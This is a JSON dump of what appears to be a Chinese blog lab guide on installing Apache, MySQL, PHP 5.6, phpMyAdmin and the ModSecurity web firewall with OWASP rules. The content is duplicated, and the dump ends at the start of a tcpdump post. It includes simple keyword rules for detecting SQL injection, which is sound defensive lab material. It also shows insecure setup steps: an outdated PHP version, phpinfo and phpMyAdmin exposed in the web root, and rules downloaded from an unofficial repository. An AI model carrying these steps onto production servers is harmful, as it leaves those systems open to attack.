update</span><br><span class=\"line\">sudo apt install php5.6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">首先使用命令禁用 PHP 7.2 模块</span></span><br><span class=\"line\">sudo a2dismod php7.2</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">启用 PHP 5.6 模块</span></span><br><span class=\"line\">sudo a2enmod php5.6</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install libapache2-mod-php5.6 php-mysql5.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">重启apache2</span></span><br><span class=\"line\">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>\n\n<p>其他配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">将 PHP 5.6 设置为默认版本</span></span><br><span class=\"line\">sudo update-alternatives --set php /usr/bin/php5.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">设置默认情况下要使用的全局 PHP 版本</span></span><br><span class=\"line\">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置phpmyadmin\"><a href=\"#配置phpmyadmin\" class=\"headerlink\" title=\"配置phpmyadmin\"></a>配置phpmyadmin</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">安装phpmyadmin,安装中会要求输入数据库连接密码</span></span><br><span class=\"line\">sudo apt install phpmyadmin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">创建软链接到web根目录下（我的是/var/www/html/)</span></span><br><span class=\"line\">sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install php5.6-mbstring</span><br><span class=\"line\">sudo apt-get install php5.6-gettext</span><br></pre></td></tr></table></figure>\n\n<p>如果出现<code>The mbstring extension is missing. Please check your PHP configuration.</code>的错误</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">确保php_mbstring安装，且配置文件打开(下面是我的目录)</span></span><br><span class=\"line\">/etc/php/5.6/apache2/php.ini</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/003.png\" alt=\"003\"></p>\n<h2 id=\"modsecurity\"><a href=\"#modsecurity\" class=\"headerlink\" title=\"modsecurity\"></a>modsecurity</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加源</span></span><br><span class=\"line\">sudo vim /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装modsecurity\"><a href=\"#安装modsecurity\" class=\"headerlink\" title=\"安装modsecurity\"></a>安装modsecurity</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install libxml2 libxml2-dev libxml2-utils libaprutil1 libaprutil1-dev libapache2-modsecurity</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"开启ModSecurity功能\"><a href=\"#开启ModSecurity功能\" class=\"headerlink\" title=\"开启ModSecurity功能\"></a>开启ModSecurity功能</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/modsecurity/</span><br><span class=\"line\">sudo mv modsecurity.conf-recommended modsecurity.conf</span><br><span class=\"line\">sudo vim /etc/modsecurity/modsecurity.conf</span><br><span class=\"line\"></span><br><span class=\"line\">查找SecRuleEngine，并将其修改为On：</span><br><span class=\"line\">SecRuleEngine On</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装OWASP-Rule-Set\"><a href=\"#安装OWASP-Rule-Set\" class=\"headerlink\" title=\"安装OWASP Rule Set\"></a>安装OWASP Rule Set</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~</span><br><span class=\"line\">sudo wget https://github.com/root25/MODSEC/raw/master/modsecurity-crs_2.2.5.tar.gz</span><br><span class=\"line\">sudo tar -zxvf modsecurity-crs_2.2.5.tar.gz</span><br><span class=\"line\">sudo mkdir -p /usr/share/modsecurity-crs</span><br><span class=\"line\">sudo cp -R modsecurity-crs_2.2.5/* /usr/share/modsecurity-crs/</span><br></pre></td></tr></table></figure>\n\n<p>在<code>/usr/share/modsecurity-crs/</code>的目录下，有主要的几个规则目录，activated_rules、slr_rules、optional_rules和base_rules.</p>\n<p>将srl_rules、base_rules和optional_rules目录下的所有conf文件，拷贝到activated_rules目录下。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cp /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf.example /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf</span><br><span class=\"line\"></span><br><span class=\"line\">cd /usr/share/modsecurity-crs/activated_rules</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/base_rules/* .</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/optional_rules/* .</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/slr_rules/* .</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"在apache中启用modsecurity模块\"><a href=\"#在apache中启用modsecurity模块\" class=\"headerlink\" title=\"在apache中启用modsecurity模块\"></a>在apache中启用modsecurity模块</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apache2/mods-available/security2.conf</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">在 … 中加入以下内容，保存退出。</span></span><br><span class=\"line\">includeOptional /etc/modsecurity/*.conf</span><br><span class=\"line\">include /usr/share/modsecurity-crs/*.conf</span><br><span class=\"line\">include /usr/share/modsecurity-crs/activated_rules/*.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">因为要用自己的规则，修改如下</span></span><br><span class=\"line\">&lt;IfModule security2_module&gt;</span><br><span class=\"line\">        # Default Debian dir for modsecurity's persistent data</span><br><span class=\"line\">        SecDataDir /var/cache/modsecurity</span><br><span class=\"line\"></span><br><span class=\"line\">        # Include all the *.conf files in /etc/modsecurity.</span><br><span class=\"line\">        # Keeping your local configuration in that directory</span><br><span class=\"line\">        # will allow for an easy upgrade of THIS file and</span><br><span class=\"line\">        # make your life easier</span><br><span class=\"line\">        IncludeOptional /etc/modsecurity/*.conf</span><br><span class=\"line\"></span><br><span class=\"line\">        # Include OWASP ModSecurity CRS rules if installed</span><br><span class=\"line\">        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load</span><br><span class=\"line\">        include /usr/share/modsecurity-crs/activated_rules/my.conf</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"启用headers和Modsecurity\"><a href=\"#启用headers和Modsecurity\" class=\"headerlink\" title=\"启用headers和Modsecurity\"></a>启用headers和Modsecurity</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo a2enmod headers</span><br><span class=\"line\">sudo a2enmod security2</span><br></pre></td></tr></table></figure>\n\n<p>在中<code>/usr/share/modsecurity-crs/activated_rules/my.conf</code>编写规则测试即可</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SecRule ARGS \"@contains select\" \"id:00001,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,deny\"</span><br><span class=\"line\"></span><br><span class=\"line\">SecRule ARGS \"@contains union\" \"id:00002,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,block\"</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"ModSecurity\"><a href=\"#ModSecurity\" class=\"headerlink\" title=\"ModSecurity\"></a>ModSecurity</h1><hr>\n<h2 id=\"配置环境-ubuntu18-04\"><a href=\"#配置环境-ubuntu18-04\" class=\"headerlink\" title=\"配置环境(ubuntu18.04)\"></a>配置环境(ubuntu18.04)</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">备份源</span></span><br><span class=\"line\">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加阿里云源</span></span><br><span class=\"line\">sudo vim /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">把以下内容覆盖</span></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">保存退出后更新软件列表</span></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">更新软件包</span></span><br><span class=\"line\">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装apache\"><a href=\"#安装apache\" class=\"headerlink\" title=\"安装apache\"></a>安装apache</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install apache2</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/001.png\" alt=\"001\"></p>\n<h2 id=\"安装MYSQL\"><a href=\"#安装MYSQL\" class=\"headerlink\" title=\"安装MYSQL\"></a>安装MYSQL</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install mysql-server</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置root密码\"><a href=\"#设置root密码\" class=\"headerlink\" title=\"设置root密码\"></a>设置root密码</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo su</span><br><span class=\"line\">mysql</span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> select user, plugin from mysql.user;</span></span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\">| user             | plugin                |</span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\">| root             | auth_socket           |</span><br><span class=\"line\">| mysql.session    | mysql_native_password |</span><br><span class=\"line\">| mysql.sys        | mysql_native_password |</span><br><span class=\"line\">| debian-sys-maint | mysql_native_password |</span><br><span class=\"line\">+------------------+-----------------------+</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> update mysql.user <span class=\"built_in\">set</span> authentication_string=PASSWORD(<span class=\"string\">'密码'</span>), plugin=<span class=\"string\">'mysql_native_password'</span> <span class=\"built_in\">where</span> user=<span class=\"string\">'root'</span>;</span></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> flush privileges;</span></span><br><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> <span class=\"built_in\">exit</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">重启mysql</span></span><br><span class=\"line\">sudo /etc/init.d/mysql restart</span><br><span class=\"line\">mysql -uroot -p</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"安装PHP\"><a href=\"#安装PHP\" class=\"headerlink\" title=\"安装PHP\"></a>安装PHP</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install php libapache2-mod-php php-mysql</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加info.php文件来测试</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/002.png\" alt=\"002\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">默认版本不符合实验，安装PHP5.6</span></span><br><span class=\"line\">sudo add-apt-repository -y ppa:ondrej/php</span><br><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install php5.6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">首先使用命令禁用 PHP 7.2 模块</span></span><br><span class=\"line\">sudo a2dismod php7.2</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">启用 PHP 5.6 模块</span></span><br><span class=\"line\">sudo a2enmod php5.6</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install libapache2-mod-php5.6 php-mysql5.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">重启apache2</span></span><br><span class=\"line\">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>\n\n<p>其他配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">将 PHP 5.6 设置为默认版本</span></span><br><span class=\"line\">sudo update-alternatives --set php /usr/bin/php5.6</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">设置默认情况下要使用的全局 PHP 版本</span></span><br><span class=\"line\">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"配置phpmyadmin\"><a href=\"#配置phpmyadmin\" class=\"headerlink\" title=\"配置phpmyadmin\"></a>配置phpmyadmin</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">安装phpmyadmin,安装中会要求输入数据库连接密码</span></span><br><span class=\"line\">sudo apt install phpmyadmin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">创建软链接到web根目录下（我的是/var/www/html/)</span></span><br><span class=\"line\">sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get install php5.6-mbstring</span><br><span class=\"line\">sudo apt-get install php5.6-gettext</span><br></pre></td></tr></table></figure>\n\n<p>如果出现<code>The mbstring extension is missing. Please check your PHP configuration.</code>的错误</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">确保php_mbstring安装，且配置文件打开(下面是我的目录)</span></span><br><span class=\"line\">/etc/php/5.6/apache2/php.ini</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/modsecurity/003.png\" alt=\"003\"></p>\n<h2 id=\"modsecurity\"><a href=\"#modsecurity\" class=\"headerlink\" title=\"modsecurity\"></a>modsecurity</h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">添加源</span></span><br><span class=\"line\">sudo vim /etc/apt/sources.list</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装modsecurity\"><a href=\"#安装modsecurity\" class=\"headerlink\" title=\"安装modsecurity\"></a>安装modsecurity</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install libxml2 libxml2-dev libxml2-utils libaprutil1 libaprutil1-dev libapache2-modsecurity</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"开启ModSecurity功能\"><a href=\"#开启ModSecurity功能\" class=\"headerlink\" title=\"开启ModSecurity功能\"></a>开启ModSecurity功能</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/modsecurity/</span><br><span class=\"line\">sudo mv modsecurity.conf-recommended modsecurity.conf</span><br><span class=\"line\">sudo vim /etc/modsecurity/modsecurity.conf</span><br><span class=\"line\"></span><br><span class=\"line\">查找SecRuleEngine，并将其修改为On：</span><br><span class=\"line\">SecRuleEngine On</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装OWASP-Rule-Set\"><a href=\"#安装OWASP-Rule-Set\" class=\"headerlink\" title=\"安装OWASP Rule Set\"></a>安装OWASP Rule Set</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~</span><br><span class=\"line\">sudo wget https://github.com/root25/MODSEC/raw/master/modsecurity-crs_2.2.5.tar.gz</span><br><span class=\"line\">sudo tar -zxvf modsecurity-crs_2.2.5.tar.gz</span><br><span class=\"line\">sudo mkdir -p /usr/share/modsecurity-crs</span><br><span class=\"line\">sudo cp -R modsecurity-crs_2.2.5/* /usr/share/modsecurity-crs/</span><br></pre></td></tr></table></figure>\n\n<p>在<code>/usr/share/modsecurity-crs/</code>的目录下，有主要的几个规则目录，activated_rules、slr_rules、optional_rules和base_rules.</p>\n<p>将srl_rules、base_rules和optional_rules目录下的所有conf文件，拷贝到activated_rules目录下。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cp /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf.example /usr/share/modsecurity-crs/modsecurity-crs_10_setup.conf</span><br><span class=\"line\"></span><br><span class=\"line\">cd /usr/share/modsecurity-crs/activated_rules</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/base_rules/* .</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/optional_rules/* .</span><br><span class=\"line\"></span><br><span class=\"line\">sudo cp /usr/share/modsecurity-crs/slr_rules/* .</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"在apache中启用modsecurity模块\"><a href=\"#在apache中启用modsecurity模块\" class=\"headerlink\" title=\"在apache中启用modsecurity模块\"></a>在apache中启用modsecurity模块</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo vim /etc/apache2/mods-available/security2.conf</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">在 … 中加入以下内容，保存退出。</span></span><br><span class=\"line\">includeOptional /etc/modsecurity/*.conf</span><br><span class=\"line\">include /usr/share/modsecurity-crs/*.conf</span><br><span class=\"line\">include /usr/share/modsecurity-crs/activated_rules/*.conf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">因为要用自己的规则，修改如下</span></span><br><span class=\"line\">&lt;IfModule security2_module&gt;</span><br><span class=\"line\">        # Default Debian dir for modsecurity's persistent data</span><br><span class=\"line\">        SecDataDir /var/cache/modsecurity</span><br><span class=\"line\"></span><br><span class=\"line\">        # Include all the *.conf files in /etc/modsecurity.</span><br><span class=\"line\">        # Keeping your local configuration in that directory</span><br><span class=\"line\">        # will allow for an easy upgrade of THIS file and</span><br><span class=\"line\">        # make your life easier</span><br><span class=\"line\">        IncludeOptional /etc/modsecurity/*.conf</span><br><span class=\"line\"></span><br><span class=\"line\">        # Include OWASP ModSecurity CRS rules if installed</span><br><span class=\"line\">        #IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load</span><br><span class=\"line\">        include /usr/share/modsecurity-crs/activated_rules/my.conf</span><br><span class=\"line\">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"启用headers和Modsecurity\"><a href=\"#启用headers和Modsecurity\" class=\"headerlink\" title=\"启用headers和Modsecurity\"></a>启用headers和Modsecurity</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo a2enmod headers</span><br><span class=\"line\">sudo a2enmod security2</span><br></pre></td></tr></table></figure>\n\n<p>在中<code>/usr/share/modsecurity-crs/activated_rules/my.conf</code>编写规则测试即可</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SecRule ARGS \"@contains select\" \"id:00001,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,deny\"</span><br><span class=\"line\"></span><br><span class=\"line\">SecRule ARGS \"@contains union\" \"id:00002,msg:'SQL Injection maybe',phase:1,t:compressWhitespace,t:htmlEntityDecode,block\"</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Tcpdump使用实验","date":"2018-09-20T01:09:12.000Z","_content":"# <center>Tcpdump使用实验</center> # \n\n## 【目的】 ##\n\n学习使用tcpdump工具，tcpdump是最常用的网络数据分析工具之一。\n\n## 【原理】 ##\n\ntcpdump和wireshark一样,是一个抓包工具,基于libpcap开发的,过滤机制使用内核的BPF过滤,在linux下使用,也可以把tcpdump当成linux的命令。多数linux服务器是不按照图形界面的，在这种情况下，就可以使用tcpdump。\n\n## 